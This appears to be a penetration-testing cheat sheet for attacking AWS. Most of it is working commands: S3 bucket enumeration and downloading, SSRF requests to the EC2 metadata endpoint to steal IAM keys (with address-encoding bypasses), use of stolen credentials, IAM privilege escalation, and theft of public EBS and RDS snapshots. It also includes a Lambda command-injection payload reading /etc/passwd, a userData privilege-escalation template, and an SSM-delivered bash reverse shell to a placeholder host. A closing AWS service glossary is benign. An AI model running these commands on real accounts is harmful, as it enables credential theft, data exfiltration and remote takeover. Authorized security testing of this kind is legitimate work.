# AWS

## AWS basic info

```text
Auth methods:
• Programmatic access - Access + Secret Key
   ◇ Secret Access Key and Access Key ID for authenticating via scripts and CLI
• Management Console Access
   ◇ Web Portal Access to AWS

Recon:
• AWS Usage
   ◇ Some web applications may pull content directly from S3 buckets
   ◇ Look to see where web resources are being loaded from to determine if S3 buckets are being utilized
   ◇ Burp Suite
   ◇ Navigate application like you normally would and then check for any requests to:
      ▪ https://[bucketname].s3.amazonaws.com
      ▪ https://s3-[region].amazonaws.com/[OrgName]

S3:
• Amazon Simple Storage Service (S3)
   ◇ Storage service that is “secure by default”
   ◇ Configuration issues tend to unsecure buckets by making them publicly accessible
   ◇ Nslookup can help reveal region
   ◇ S3 URL Format:
      ▪ https://[bucketname].s3.amazonaws.com
      ▪ https://s3-[region].amazonaws.com/[Org Name]
        # aws s3 ls s3://bucket-name-here --region 
        # aws s3api get-bucket-acl --bucket bucket-name-here
        # aws s3 cp readme.txt  s3://bucket-name-here --profile newuserprofile

EBS Volumes:
• Elastic Block Store (EBS)
• AWS virtual hard disks
• Can have similar issues to S3 being publicly available
• Difficult to target specific org but can find widespread leaks

EC2:
• Like virtual machines
• SSH keys created when started, RDP for Windows.
• Security groups to handle open ports and allowed IPs.

AWS Instance Metadata URL
• Cloud servers hosted on services like EC2 needed a way to orient themselves because of how dynamic they are
• A “Metadata” endpoint was created and hosted on a non-routable IP address at 169.254.169.254
• Can contain access/secret keys to AWS and IAM credentials
• This should only be reachable from the localhost
• Server compromise or SSRF vulnerabilities might allow remote attackers to reach it
• IAM credentials can be stored here:
   ◇ http://169.254.169.254/latest/meta-data/iam/security-credentials/
• Can potentially hit it externally if a proxy service (like Nginx) is being hosted in AWS.
   ◇ curl --proxy vulndomain.target.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo
• CapitalOne Hack
   ◇ Attacker exploited SSRF on EC2 server and accessed metadata URL to get IAM access keys. Then, used keys to dump S3 bucket containing 100 million individual’s data.
• AWS EC2 Instance Metadata service Version 2 (IMDSv2)
• Updated in November 2019 – Both v1 and v2 are available
• Supposed to defend the metadata service against SSRF and reverse proxy vulns
• Added session auth to requests
• First, a “PUT” request is sent and then responded to with a token
• Then, that token can be used to query data
--
TOKEN=`curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"`
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
curl http://example.com/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role
--

Post-compromise
• What do our access keys give us access to?
• Check AIO tools to do some recon (WeirdAAL- recon_module, PACU privesc,...)

http://169.254.169.254/latest/meta-data
http://169.254.169.254/latest/meta-data/iam/security-credentials/<IAM Role Name>

# AWS nuke - remove all AWS services of our account
# https://github.com/rebuy-de/aws-nuke
- Fill nuke-config.yml with the output of aws sts get-caller-identity
./aws-nuke -c nuke-config.yml # Checks what will be removed
- If fails because there is no alias created
aws iam create-account-alias --account-alias unique-name
./aws-nuke -c nuke-config.yml --no-dry-run # Will perform delete operation

# Cloud Nuke
# https://github.com/gruntwork-io/cloud-nuke
cloud-nuke aws

# Other bypasses
1.
aws eks list-clusters | jq -rc '.clusters'
["example"]
aws eks update-kubeconfig --name example
kubectl get secrets

2. SSRF AWS Bypasses to access metadata endpoint.
Converted Decimal IP: http://2852039166/latest/meta-data/
IPV6 Compressed: http://[::ffff:a9fe:a9fe]/latest/meta-data/
IPV6 Expanded: http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/

# Interesting metadata instance urls:
http://instance-data
http://169.254.169.254
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/reservation-id
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
http://169.254.169.254/latest/dynamic/instance-identity/document
```

### Find AWS in domain/company

```text
# Find subdomains

./sub.sh -s example.com
assetfinder example.com
## Bruteforcing
python3 dnsrecon.py -d example.com -D subdomains-top1mil-5000.txt -t brt

# Reverse DNS lookups
host subdomain.domain.com
host IP

# Bucket finders
python3 cloud_enum.py -k example.com
ruby lazys3.rb companyname
# https://github.com/bbb31/slurp
slurp domain -t example.com
```

### AIO AWS tools

```text
# https://github.com/carnal0wnage/weirdAAL
pip3 install -r requirements
cp env.sample .env
vim .env
python3 weirdAAL.py -l

# https://github.com/RhinoSecurityLabs/pacu
bash install.sh
python3 pacu.py
import_keys --all
ls

# https://github.com/dagrz/aws_pwn
# Lot of scripts for different purposes, check github

# IAM resources finder
# https://github.com/BishopFox/smogcloud
smogcloud

# Red team scripts for AWS
# https://github.com/elitest/Redboto

# AWS Bloodhound
# https://github.com/lyft/cartography

# AWS Exploitation Framework
# https://github.com/grines/scour
```

## S3

### Basic Commands

```text
aws s3 ls s3:// 
aws s3api list-buckets
aws s3 ls s3://bucket.com
aws s3 ls --recursive s3://bucket.com
aws s3 sync s3://bucketname s3-files-dir
aws s3 cp s3://bucket-name/<file> <destination>
aws s3 cp/mv test-file.txt s3://bucket-name
aws s3 rm s3://bucket-name/test-file.txt
aws s3api get-bucket-acl --bucket bucket-name # Check owner
aws s3api head-object --bucket bucket-name --key file.txt # Check file metadata
```

### Find S3 buckets

```text
# Find buckets from keyword or company name
# https://github.com/nahamsec/lazys3
ruby lazys3.rb companyname

# https://github.com/initstring/cloud_enum
python3 cloud_enum.py -k companynameorkeyword

# https://github.com/gwen001/s3-buckets-finder
php s3-buckets-bruteforcer.php --bucket gwen001-test002

# Public s3 buckets
https://buckets.grayhatwarfare.com
https://github.com/eth0izzle/bucket-stream

# https://github.com/cr0hn/festin
festin mydomain.com
festin -f domains.txt 

# Google dork
site:.s3.amazonaws.com "Company"
```

### Check S3 buckets perms and files

```text
# https://github.com/fellchase/flumberboozle/tree/master/flumberbuckets
alias flumberbuckets='sudo python3 PATH/flumberboozle/flumberbuckets/flumberbuckets.py -p'
echo "bucket" | flumberbuckets -si -
cat hosts.txt | flumberbuckets -si -

# https://github.com/sa7mon/S3Scanner
sudo python3 s3scanner.py sites.txt
sudo python ./s3scanner.py --include-closed --out-file found.txt --dump names.txt

# https://github.com/clario-tech/s3-inspector
python s3inspector.py

# https://github.com/jordanpotti/AWSBucketDump
source /home/cloudhacker/tools/AWSBucketDump/bin/activate
touch s.txt
sed -i "s,$,-$bapname-awscloudsec,g" /home/cloudhacker/tools/AWSBucketDump/BucketNames.txt
python AWSBucketDump.py -D -l BucketNames.txt -g s.txt

# https://github.com/Ucnt/aws-s3-data-finder/
python3 find_data.py -n bucketname -u

# https://github.com/VirtueSecurity/aws-extender-cli
python3 aws_extender_cli.py -s S3 -b flaws.cloud
```

### **S3 examples attacks**

```text
# S3 Bucket Pillaging

• GOAL: Locate Amazon S3 buckets and search them for interesting data
• In this lab you will attempt to identify a publicly accessible S3 bucket hosted by an organization. After identifying it you will list out the contents of it and download the files hosted there.

~$ sudo apt-get install python3-pip
~$ git clone https://github.com/RhinoSecurityLabs/pacu
~$ cd pacu
~$ sudo bash install.sh
~$ sudo aws configure
~$ sudo python3 pacu.py

Pacu > import_keys --all
# Search by domain
Pacu > run s3__bucket_finder -d glitchcloud 
# List files in bucket
Pacu > aws s3 ls s3://glitchcloud
# Download files
Pacu > aws s3 sync s3://glitchcloud s3-files-dir

# S3 Code Injection
• Backdoor JavaScript in S3 Buckets used by webapps 
• In March, 2018 a crypto-miner malware was found to be loading on MSN’s homepage
• This was due to AOL’s advertising platform having a writeable S3 bucket, which was being served by MSN
• If a webapp is loading content from an S3 bucket made publicly writeable attackers can upload  malicious JS to get executed by visitors 
• Can perform XSS-type attacks against webapp visitors
• Hook browser with Beef

# Domain Hijacking
• Hijack S3 domain by finding references in a webapp to S3 buckets that don’t exist anymore
• Or… subdomains that were linked to an S3 bucket with CNAME’s that still exist
• When assessing webapps look for 404’s to *.s3.amazonaws.com
• When brute forcing subdomains for an org look for 404’s with ‘NoSuchBucket’ error 
• Go create the S3 bucket with the same name and region 
• Load malicious content to the new S3 bucket that will be executed when visitors hit the site
```

### Enumerate read access buckets script

```bash
#!/bin/bash
for i in "$@" ; do
 if [[ $i == "--profile" ]] ; then
            profile=$(echo "$@" | awk '{for(i=1;i<=NF;i++) if ($i=="--profile") print $(i+1)}')
            AWS_ACCESS_KEY_ID=$(cat /root/.aws/credentials | grep -i "$profile" -A 2 | grep -i = | cut -d " " -f 3 | head -n 1)
            AWS_SECRET_ACCESS_KEY=$(cat /root/.aws/credentials | grep -i "$profile" -A 2 | grep -i = | cut -d " " -f 3 | tail -n 1)
            break
        fi
done
echo "Enumerating the buckets..."
    aws --profile "$profile" s3 ls | cut -d ' ' -f 3 > /tmp/buckets
echo "You can read the following buckets:"
    >/tmp/readBuckets
for i in $(cat /tmp/buckets); do
    result=$(aws --profile "$profile" s3 ls s3://"$i" 2>/dev/null | head -n 1)
    if [ ! -z "$result" ]; then
            echo "$i" | tee /tmp/readBuckets
                    unset result
    fi
done
```

## IAM

### Basic commands

```text
# ~/.aws/credentials
[default]
aws_access_key_id = XXX
aws_secret_access_key = XXXX

export AWS_ACCESS_KEY_ID=
export AWS_SECRET_ACCESS_KEY=
export AWS_DEFAULT_REGION=

# Check valid
aws sts get-caller-identity
aws sdb list-domains --region us-east-1

# If we can steal AWS credentials, add to your configuration
aws configure --profile stolen
# Open ~/.aws/credentials
# Under the [stolen] section add aws_session_token and add the discovered token value here
aws sts get-caller-identity --profile stolen

# Get account id
aws sts get-access-key-info --access-key-id=ASIA1234567890123456

aws iam get-account-password-policy
aws sts get-session-token
aws iam list-users
aws iam list-roles
aws iam list-access-keys --user-name <username>
aws iam create-access-key --user-name <username>
aws iam list-attached-user-policies --user-name XXXX
aws iam get-policy
aws iam get-policy-version

aws deploy list-applications

aws directconnect describe-connections

aws secretsmanager get-secret-value --secret-id <value> --profile <container tokens>

aws sns publish --topic-arn arn:aws:sns:us-east-1:*account id*:aaa --message aaa

# IAM Prefix meaning
ABIA - AWS STS service bearer token
ACCA - Context-specific credential
AGPA - Group
AIDA - IAM user
AIPA - Amazon EC2 instance profile
AKIA - Access key
ANPA - Managed policy
ANVA - Version in a managed policy
APKA - Public key
AROA - Role
ASCA - Certificate
ASIA - Temporary (AWS STS) access key IDs use this prefix, but are unique only in combination with the secret access key and the session token.
```

### Tools

```text
# https://github.com/andresriancho/enumerate-iam
python enumerate-iam.py --access-key XXXXXXXXXXXXX --secret-key XXXXXXXXXXX
python enumerate-iam.py --access-key "ACCESSKEY" --secret-key "SECRETKEY" (--session-token "$AWS_SESSION_TOKEN")

# https://github.com/RhinoSecurityLabs/Security-Research/blob/master/tools/aws-pentest-tools/aws_escalate.py
python aws_escalate.py

# https://github.com/andresriancho/nimbostratus
python2 nimbostratus dump-permissions

# https://github.com/nccgroup/ScoutSuite
python3 scout.py aws

# https://github.com/salesforce/cloudsplaining
cloudsplaining download
cloudsplaining scan

# Enumerate IAM permissions without logging (stealth mode)
# https://github.com/Frichetten/aws_stealth_perm_enum

# Unauthenticated (only account id) Enumeration of IAM Users and Roles 
# https://github.com/Frichetten/enumate_iam_using_bucket_policy

# AWS Consoler
# https://github.com/NetSPI/aws_consoler
# Generate link to console from valid credentials
aws_consoler -a ASIAXXXX -s SECRETXXXX -t TOKENXXXX

# AWSRoleJuggler
# https://github.com/hotnops/AWSRoleJuggler/
# You can use one assumed role to assume another one
./find_circular_trust.py 
python aws_role_juggler.py -r arn:aws:iam::123456789:role/BuildRole arn:aws:iam::123456789:role/GitRole arn:aws:iam::123456789:role/ArtiRole

# https://github.com/prisma-cloud/IAMFinder
python3 iamfinder.py init
python3 iamfinder.py enum_user --aws_id 123456789012

# https://github.com/nccgroup/PMapper
# Check IAM permissions
```

### AWS IAM Cli Enumeration

```bash
# First of all, set your profile
aws configure --profile test 
set profile=test # Just for convenience

# Get policies available
aws --profile "$profile" iam list-policies | jq -r ".Policies[].Arn"
# Get specific policy version
aws --profile "$profile" iam get-policy --policy-arn "$i" --query "Policy.DefaultVersionId" --output text
# Get all juicy info oneliner (search for Action/Resource */*)
profile="test"; for i in $(aws --profile "$profile" iam list-policies | jq -r '.Policies[].Arn'); do echo "Describing policy $i" && aws --profile "$profile" iam get-policy-version --policy-arn "$i" --version-id $(aws --profile "$profile" iam get-policy --policy-arn "$i" --query 'Policy.DefaultVersionId' --output text); done | tee /tmp/policies.log 

#List Managed User policies
aws --profile "test" iam list-attached-user-policies --user-name "test-user"
#List Managed Group policies
aws --profile "test" iam list-attached-group-policies --group-name "test-group"
#List Managed Role policies
aws --profile "test" iam list-attached-role-policies --role-name "test-role"

#List Inline User policies
aws --profile "test" iam list-user-policies --user-name "test-user"
#List Inline Group policies
aws --profile "test" iam list-group-policies --group-name "test-group"
#List Inline Role policies
aws --profile "test" iam list-role-policies --role-name "test-role"

#Describe Inline User policies 
aws --profile "test" iam get-user-policy --user-name "test-user" --policy-name "test-policy"
#Describe Inline Group policies
aws --profile "test" iam get-group-policy --group-name "test-group" --policy-name "test-policy"
#Describe Inline Role policies
aws --profile "test" iam get-role-policy --role-name "test-role" --policy-name "test-policy"

# List roles policies
aws --profile "test" iam get-role --role-name "test-role" 

# Assume role from any ec2 instance (get Admin)
# Create instance profile
aws iam create-instance-profile --instance-profile-name YourNewRole-Instance-Profile
# Associate role to Instance Profile
aws iam add-role-to-instance-profile --role-name YourNewRole --instance-profile-name YourNewRole-Instance-Profile
# Associate Instance Profile with instance you want to use
aws ec2 associate-iam-instance-profile --instance-id YourInstanceId --iam-instance-profile Name=YourNewRole-Instance-Profile

# Get assumed roles in instance
aws --profile test sts get-caller-identity

# Shadow admin
aws iam list-attached-user-policies --user-name {}
aws iam get-policy-version --policy-arn provide_policy_arn --version-id $(aws iam get-policy --policy-arn provide_policy_arn --query 'Policy.DefaultVersionId' --output text)
aws iam list-user-policies --user-name {}
aws iam get-user-policy --policy-name policy_name_from_above_command --user-name {} | python -m json.tool
# Vulnerables policies:
iam:CreatUser
iam:CreateLoginProfile
iam:UpdateProfile
iam:AddUserToGroup
```

## EBS

### Find secrets in public EBS

```text
# Dufflebag https://github.com/bishopfox/dufflebag
```

### **EBS attack example**

```text
# Discover EBS Snapshot and mount it to navigate
- Obtaning public snapshot name
aws ec2 describe-snapshots --region us-east-1 --restorable-by-user-ids all | grep -C 10 "company secrets"
- Obtaining zone and instance
aws ec2 describe-instances --filters Name=tag:Name,Values=attacker-machine
- Create a new volume of it
aws ec2 create-volume --snapshot-id snap-03616657ede4b9862 --availability-zone <ZONE-HERE>
- Attach to an EC2 instance
aws ec2 attach-volume --device /dev/sdh --instance-id <INSTANCE-ID> --volume-id <VOLUME-ID>
    - It takes some time, to see the status:
    aws ec2 describe-volumes --filters Name=volume-id,Values=<VOLUME-ID>
- Once is mounted in EC2 instance, check it, mount it and access it:
sudo lsblk
sudo mount /dev/xvdh1 /mnt
cd /mnt/home/user/companydata
```

```text
# WeirdAAL https://github.com/carnal0wnage/weirdAAL
```

## **EC2**

### **EC2 basic commands**

```text
# Like traditional host
- Port enumeration
- Attack interesting services like ssh or rdp

aws ec2 describe-instances
aws ssm describe-instance-information
aws ec2 describe-snapshots
aws ec2 describe-security-groups --group-ids <VPC Security Group ID> --region <region>
aws ec2 create-volume --snapshot-id snap-123123123
aws ec2 describe-snapshots --owner-ids {user-id}

# SSH into created instance:
ssh -i ".ssh/key.pem" <user>@<instance-ip>
sudo mount /dev/xvdb1 /mnt
cat /mnt/home/ubuntu/setupNginx.sh

# EC2 security group
aws ec2 describe-security-groups
aws ec2 describe-security-groups --filters Name=ip-permission.cidr,Values='0.0.0.0/0' --query "SecurityGroups[*].[GroupName]" --output text
```

### **EC2 example attacks**

```text
# SSRF to http://169.254.169.254 (Metadata server)
curl http://<ec2-ip-address>/\?url\=http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data
http://169.254.169.254/latest/meta-data/ami-id
http://169.254.169.254/latest/meta-data/public-hostname
http://169.254.169.254/latest/meta-data/public-keys/
http://169.254.169.254/latest/meta-data/network/interfaces/
http://169.254.169.254/latest/meta-data/local-ipv4
http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key/
http://169.254.169.254/latest/user-data

# Find IAM Security Credentials
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Using EC2 instance metadata tool
ec2-metadata -h
# With EC2 Instance Meta Data Service version 2 (IMDSv2):
Append X-aws-ec2-metadata-token Header generated with a PUT request to http://169.254.169.254/latest/api/token

# Check directly for metadata instance
curl -s http://<ec2-ip-address>/latest/meta-data/ -H 'Host:169.254.169.254'

# EC2 instance connect
aws ec2 describe-instances | jq ".[][].Instances | .[] | {InstanceId, KeyName, State}"
aws ec2-instance-connect send-ssh-public-key --region us-east-1 --instance-id INSTANCE_WE_GOT_PREVIOUSLY --availability-zone zone --instance-os-user ubuntu --ssh-public-key file://shortkey.pub

# EC2 AMI - Read instance, create AMI for instance and run
aws ec2 describe-images --region specific-region
aws ec2 create-image --instance-id ID --name "EXPLOIT" --description "Export AMI" --region specific-region
aws ec2 import-key-pair --key-name "EXPLOIT" --public-key-material fileb:///publickeyfile
aws ec2 describe-images --filters "Name=name,Values=EXPLOIT"
aws ec2 run-instances --image-id {} --security-group-ids "" --subnet-id {} --count 1 --instance-type t2.micro --key-name EXPLOIT

# Create volume from snapshot & attach to instance id && mount in local
aws ec2 create-volume –snapshot-id snapshot_id --availability-zone zone
aws ec2 attach-volume --volume-id above-volume-id --instance-id instance-id --device /dev/sdf

# Privesc with modify-instance-attribute
aws ec2 modify-instance-attribute --instance-id=xxx --attribute userData --value file://file.b64.txt
file.b64.txt contains (and after base64 file.txt > file.b64.txt):
```
Content-Type: multipart/mixed; boundary="//"
MIME-Version: 1.0

--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
**commands here** (reverse shell, set ssh keys...)
--//
```

# Privesc 2 with user data
# On first launch, the EC2 instance will pull the start_script from S3 and will run it. If an adversary can write to that location, they can escalate privileges or gain control of the EC2 instance.
#!/bin/bash
aws s3 cp s3://example-boot-bucket/start_script.sh /root/start_script.sh
chmod +x /root/start_script.sh
/root/start_script.sh
```

### Tools

```text
# EC2 Shadow Copy attack
# https://github.com/Static-Flow/CloudCopy

# EC2 secrets recovery
# https://github.com/akhil-reni/ud-peep
```

## Cloudfront

### Info

```text
Cloudfront is a CDN and it checks the HOST header in CNAMES, so:
- The domain "test.disloops.com" is a CNAME record that points to "disloops.com".
- The "disloops.com" domain is set up to use a CloudFront distribution.
- Because "test.disloops.com" was not added to the "Alternate Domain Names (CNAMEs)" field for the distribution, requests to "test.disloops.com" will fail.
- Another user can create a CloudFront distribution and add "test.disloops.com" to the "Alternate Domain Names (CNAMEs)" field to hijack the domain.
```

### Tools

```text
# https://github.com/MindPointGroup/cloudfrunt
git clone --recursive https://github.com/MindPointGroup/cloudfrunt
pip install -r requirements.txt
python cloudfrunt.py -o cloudfrunt.com.s3-website-us-east-1.amazonaws.com -i S3-cloudfrunt -l list.txt
```

## **AWS Lambda**

### **Info**

```text
# Welcome to serverless!!!!
# AWS Lambda, essentially are short lived servers that run your function and provide you with output that can be then used in other applications or consumed by other endpoints.

# OS command Injection in Lambda
curl "https://API-endpoint/api/stringhere"

# For a md5 converter endpoint "https://API-endpoint/api/hello;id;w;cat%20%2fetc%2fpasswd"
aws lambda list-functions
aws lambda get-function --function-name <FUNCTION-NAME>
aws lambda get-policy
aws apigateway get-stages

# Download function code
aws lambda list-functions
aws lambda get-function --function-name name_we_retrieved_from_above --query 'Code.Location'
wget -O myfunction.zip URL_from_above_step

# Steal creds via XXE or SSRF reading:
/proc/self/environ
# If blocked try to read other vars:
/proc/[1..20]/environ
```

### Tools

```text
# https://github.com/puresec/lambda-proxy
# SQLMap to Lambda!!!
python3 main.py
sqlmap -r request.txt

# https://github.com/twistlock/splash
# Pseudo Lambda Shell

```

## **AWS Inspector**

```text
# Amazon Inspector is an automated security assessment service that helps improve the security and compliance of applications deployed on AWS.
```

## **AWS RDS**

### **Basic**

```text
aws rds describe-db-instances
```

### **Attacks**

```text
# Just like a MySQL, try for sqli!
# Check if 3306 is exposed
# Sqlmap is your friend ;)

# Stealing RDS Snapshots
- Searching partial snapshots
aws rds describe-db-snapshots --include-public --snapshot-type public --db-snapshot-identifier arn:aws:rds:us-east-1:159236164734:snapshot:globalbutterdbbackup
- Restore in instance
aws rds restore-db-instance-from-db-snapshot --db-instance-identifier recoverdb --publicly-accessible --db-snapshot-identifier arn:aws:rds:us-east-1:159236164734:snapshot:globalbutterdbbackup --availability-zone us-east-1b
- Once restored, try to access
aws rds describe-db-instances --db-instance-identifier recoverdb
- Reset the master credentials
aws rds modify-db-instance --db-instance-identifier recoverdb --master-user-password NewPassword1 --apply-immediately
    - Takes some time, you can check the status:
    aws rds describe-db-instances
- Try to access it from EC2 instance which was restored
nc rds-endpoint 3306 -zvv    
- If you can't see, you may open 3306:
    - In RDS console, click on the recoverdb instance
    - Click on the Security Group
    - Add an Inbound rule for port 3306 TCP for Cloudhacker IP
 - Then connect it
 mysql -u <username> -p -h <rds-instance-endpoint>

```

## ECR

### Info

```text
Amazon Elastic Container Registry - Docker container registry
aws ecr get-login
aws ecr get-login-password | docker login --username AWS --password-stdin XXXXXXXXX.dkr.ecr.eu-west-1.amazonaws.com/some-registry && docker pull XXXXXXXX.dkr.ecr.eu-west-1.amazonaws.com/docker-test:latest && docker inspect docker-test
aws ecr list-images --repository-name REPO_NAME --registry-id ACCOUNT_ID
aws ecr batch-get-image --repository-name XXXX --registry-id XXXX --image-ids imageTag=latest
aws ecr get-download-url-for-layer --repository-name XXXX --registry-id XXXX --layer-digest "sha256:XXXXX"

```

### Tools

```text
# After AWS credentials compromised

# https://github.com/RhinoSecurityLabs/ccat
docker run -it -v ~/.aws:/root/.aws/ -v /var/run/docker.sock:/var/run/docker.sock -v ${PWD}:/app/ rhinosecuritylabs/ccat:latest
```

## ECS

### Info

```text
ECS - Elastic Container Service (is a container orchestration service)
```

## **AWS Cognito API**

Amazon Cognito is a user identity and data synchronization service. If the website uses other AWS services \(like Amazon S3, Amazon Dynamo DB, etc.\) Amazon Cognito provides you with delivering temporary credentials with limited privileges that users can use to access database resources.

```text
# Check for cognito-identity requests with GetCredentialsForIdentity 
```

![](../../.gitbook/assets/image%20%287%29.png)

![](../../.gitbook/assets/image%20%286%29.png)

## **AWS Systems Manager**

![](../../.gitbook/assets/imagen.png)

```text
# AWS SSM
- The agent must be installed in the machines
- It's used to create roles and policies

# Executing commands
aws ssm describe-instance-information #Get instance
aws ssm describe-instance-information --output text --query "InstanceInformationList[*]"
- Get "ifconfig" commandId
aws ssm send-command --instance-ids "INSTANCE-ID-HERE" --document-name "AWS-RunShellScript" --comment "IP config" --parameters commands=ifconfig --output text --query "Command.CommandId"
- Execute CommandID generated for ifconfig
aws ssm list-command-invocations --command-id "COMMAND-ID-HERE" --details --query "CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}"

# RCE
aws ssm send-command --document-name "AWS-RunShellScript" --comment "RCE test: whoami" --targets "Key=instanceids,Values=[instanceid]" --parameters 'commands=whoami'
aws ssm list-command-invocations --command-id "[CommandId]" --details

# Getting shell
- You already need to have reverse.sh uploaded to s3
#!/bin/bash
bash -i >& /dev/tcp/REVERSE-SHELL-CATCHER/9999 0>&1
- Start your listener
aws ssm send-command --document-name "AWS-RunRemoteScript" --instance-ids "INSTANCE-ID-HERE" --parameters '{"sourceType":["S3"],"sourceInfo":["{\"path\":\"PATH-TO-S3-SHELL-SCRIPT\"}"],"commandLine":["/bin/bash NAME-OF-SHELL-SCRIPT"]}' --query "Command.CommandId"

# Read info from SSM
aws ssm describe-parameters
aws ssm get-parameters --name <NameYouFindAbove>

# EC2 with SSM enabled leads to RCE
aws ssm send-command --instance-ids "INSTANCE-ID-HERE" --document-name "AWS-RunShellScript" --comment "IP Config" --parameters commands=ifconfig --output text --query "Command.CommandId" --profile stolencreds
aws ssm list-command-invocations --command-id "COMMAND-ID-HERE" --details --query "CommandInvocations[].CommandPlugins[].{Status:Status,Output:Output}" --profile stolencreds
```

## Aws Services Summary

| AWS Service | Should have been called | Use this to | It's like |
| :--- | :--- | :--- | :--- |
| EC2 | Amazon Virtual Servers | Host the bits of things you think of as a computer. | It's handwavy, but EC2 instances are similar to the virtual private servers you'd get at Linode, DigitalOcean or Rackspace. |
| IAM | Users, Keys and Certs | Set up additional users, set up new AWS Keys and policies. |  |
| S3 | Amazon Unlimited FTP Server | Store images and other assets for websites. Keep backups and share files between services. Host static websites. Also, many of the other AWS services write and read from S3. |  |
| VPC | Amazon Virtual Colocated Rack | Overcome objections that "all our stuff is on the internet!" by adding an additional layer of security. Makes it appear as if all of your AWS services are on the same little network instead of being small pieces in a much bigger network. | If you're familar with networking: VLANs |
| Lambda | AWS App Scripts | Run little self contained snippets of JS, Java or Python to do discrete tasks. Sort of a combination of a queue and execution in one. Used for storing and then executing changes to your AWS setup or responding to events in S3 or DynamoDB. |  |
| API Gateway | API Proxy | Proxy your apps API through this so you can throttle bad client traffic, test new versions, and present methods more cleanly. | 3Scale |
| RDS | Amazon SQL | Be your app's Mysql, Postgres, and Oracle database. | Heroku Postgres |
| Route53 | Amazon DNS + Domains | Buy a new domain and set up the DNS records for that domain. | DNSimple, GoDaddy, Gandi |
| SES | Amazon Transactional Email | Send one-off emails like password resets, notifications, etc. You could use it to send a newsletter if you wrote all the code, but that's not a great idea. | SendGrid, Mandrill, Postmark |
| Cloudfront | Amazon CDN | Make your websites load faster by spreading out static file delivery to be closer to where your users are. | MaxCDN, Akamai |
| CloudSearch | Amazon Fulltext Search | Pull in data on S3 or in RDS and then search it for every instance of 'Jimmy.' | Sphinx, Solr, ElasticSearch |
| DynamoDB | Amazon NoSQL | Be your app's massively scalable key valueish store. | MongoLab |
| Elasticache | Amazon Memcached | Be your app's Memcached or Redis. | Redis to Go, Memcachier |
| Elastic Transcoder | Amazon Beginning Cut Pro | Deal with video weirdness \(change formats, compress, etc.\). |  |
| SQS | Amazon Queue | Store data for future processing in a queue. The lingo for this is storing "messages" but it doesn't have anything to do with email or SMS. SQS doesn't have any logic, it's just a place to put things and take things out. | RabbitMQ, Sidekiq |
| WAF | AWS Firewall | Block bad requests to Cloudfront protected sites \(aka stop people trying 10,000 passwords against /wp-admin\) | Sophos, Kapersky |
| Cognito | Amazon OAuth as a Service | Give end users - \(non AWS\) - the ability to log in with Google, Facebook, etc. | OAuth.io |
| Device Farm | Amazon Drawer of Old Android Devices | Test your app on a bunch of different IOS and Android devices simultaneously. | MobileTest, iOS emulator |
| Mobile Analytics | Spot on Name, Amazon Product Managers take note | Track what people are doing inside of your app. | Flurry |
| SNS | Amazon Messenger | Send mobile notifications, emails and/or SMS messages | UrbanAirship, Twilio |
| CodeCommit | Amazon GitHub | Version control your code - hosted Git. | Github, BitBucket |
| Code Deploy | Not bad | Get your code from your CodeCommit repo \(or Github\) onto a bunch of EC2 instances in a sane way. | Heroku, Capistrano |
| CodePipeline | Amazon Continuous Integration | Run automated tests on your code and then do stuff with it depending on if it passes those tests. | CircleCI, Travis |
| EC2 Container Service | Amazon Docker as a Service | Put a Dockerfile into an EC2 instance so you can run a website. |  |
| Elastic Beanstalk | Amazon Platform as a Service | Move your app hosted on Heroku to AWS when it gets too expensive. | Heroku, BlueMix, Modulus |
| AppStream | Amazon Citrix | Put a copy of a Windows application on a Windows machine that people get remote access to. | Citrix, RDP |
| Direct Connect | Pretty spot on actually | Pay your Telco + AWS to get a dedicated leased line from your data center or network to AWS. Cheaper than Internet out for Data. | A toll road turnpike bypassing the crowded side streets. |
| Directory Service | Pretty spot on actually | Tie together other apps that need a Microsoft Active Directory to control them. |  |
| WorkDocs | Amazon Unstructured Files | Share Word Docs with your colleagues. | Dropbox, DataAnywhere |
| WorkMail | Amazon Company Email | Give everyone in your company the same email system and calendar. | Google Apps for Domains |
| Workspaces | Amazon Remote Computer | Gives you a standard windows desktop that you're remotely controlling. |  |
| Service Catalog | Amazon Setup Already | Give other AWS users in your group access to preset apps you've built so they don't have to read guides like this. |  |
| Storage Gateway | S3 pretending it's part of your corporate network | Stop buying more storage to keep Word Docs on. Make automating getting files into S3 from your corporate network easier. |  |
| Data Pipeline | Amazon ETL | Extract, Transform and Load data from elsewhere in AWS. Schedule when it happens and get alerts when they fail. |  |
| Elastic Map Reduce | Amazon Hadooper | Iterate over massive text files of raw data that you're keeping in S3. | Treasure Data |
| Glacier | Really slow Amazon S3 | Make backups of your backups that you keep on S3. Also, beware the cost of getting data back out in a hurry. For long term archiving. |  |
| Kinesis | Amazon High Throughput | Ingest lots of data very quickly \(for things like analytics or people retweeting Kanye\) that you then later use other AWS services to analyze. | Kafka |
